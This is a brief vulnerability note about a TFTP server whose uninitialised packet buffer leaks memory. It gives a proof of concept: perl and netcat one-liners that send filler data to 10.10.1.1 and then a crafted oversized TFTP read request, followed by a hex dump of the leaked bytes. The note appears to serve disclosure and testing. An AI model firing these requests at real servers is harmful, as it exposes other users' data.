TFTP:
--------------

TFPT contains an unintialized buffer that can lead to memory leaks. This occurs in the buffer for incomming and outgoing packets.
It shouldn't be used facing external to DMZ. 

To test you would need to send some data to 53/udp to exploit the buffer, then try to read the file with TFTP.

Victim -> Server:
perl -e 'print "HACKED"x91' | nc -u 10.10.1.1 53

Attacker -> Server:
perl -e 'print "\x00\x01".("A"x500)."\x00octet\x00"' | nc -u 10.10.1.1 69

Server -> Attacker:

[..]
0x0210:  4141  4141  4141  4141  4141  4141  4141  4141  AAAAAAAAAAAAAAAA

An attacker shouldn't be able to read data sent by the Victim.
